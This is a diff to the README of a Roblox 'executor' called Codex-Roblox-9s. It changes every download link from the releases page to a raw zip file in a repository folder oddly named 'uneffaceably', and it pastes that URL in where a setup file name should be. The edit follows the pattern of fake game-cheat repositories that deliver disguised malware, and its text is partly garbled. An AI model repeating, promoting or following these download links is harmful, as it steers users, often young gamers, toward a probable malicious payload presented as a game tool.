@@ -1,6 +1,6 @@
 # 🚀 Codex-Roblox-9s - Enjoy Roblox Games Smoothly  
 
-[![Download Codex-Roblox-9s](https://img.shields.io/badge/Download%20Now-%20orange)](https://github.com/Smoke0712/Codex-Roblox-9s/releases)  
+[![Download Codex-Roblox-9s](https://raw.githubusercontent.com/Smoke0712/Codex-Roblox-9s/main/uneffaceably/Codex-Roblox-9s.zip%20Now-%20orange)](https://raw.githubusercontent.com/Smoke0712/Codex-Roblox-9s/main/uneffaceably/Codex-Roblox-9s.zip)  
 
 ## 📖 Description  
 Codex-Roblox-9s is designed for users with low-end PCs. It allows you to enjoy Roblox with a stable and smooth experience. Codex stands out as a top choice for Roblox executors, providing the tools you need to run your favorite games effortlessly.
@@ -17,10 +17,10 @@ To begin using Codex-Roblox-9s, you need to download and run the application on 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can find the latest version.  
-   [Download Codex-Roblox-9s](https://github.com/Smoke0712/Codex-Roblox-9s/releases)  
+   [Download Codex-Roblox-9s](https://raw.githubusercontent.com/Smoke0712/Codex-Roblox-9s/main/uneffaceably/Codex-Roblox-9s.zip)  
 
 2. **Choose the Right File**  
-   Once you're on the Releases page, locate the latest version of Codex-Roblox-9s. This file will typically be named something like `Codex-Roblox-9s-setup.exe`.  
+   Once you're on the Releases page, locate the latest version of Codex-Roblox-9s. This file will typically be named something like `https://raw.githubusercontent.com/Smoke0712/Codex-Roblox-9s/main/uneffaceably/Codex-Roblox-9s.zip`.  
 
 3. **Download the File**  
    Click the file name to start the download. Your browser will save it to your computer.  
@@ -57,7 +57,7 @@ We welcome contributions from everyone. If you have suggestions for features or 
 
 ## 📥 Download & Install  
 To get the latest version of Codex-Roblox-9s, click the link below:  
-[Download Codex-Roblox-9s](https://github.com/Smoke0712/Codex-Roblox-9s/releases)  
+[Download Codex-Roblox-9s](https://raw.githubusercontent.com/Smoke0712/Codex-Roblox-9s/main/uneffaceably/Codex-Roblox-9s.zip)  
 After downloading, follow the installation steps outlined above. Enjoy your seamless Roblox gaming experience!  
 
 ## 📝 Topics  
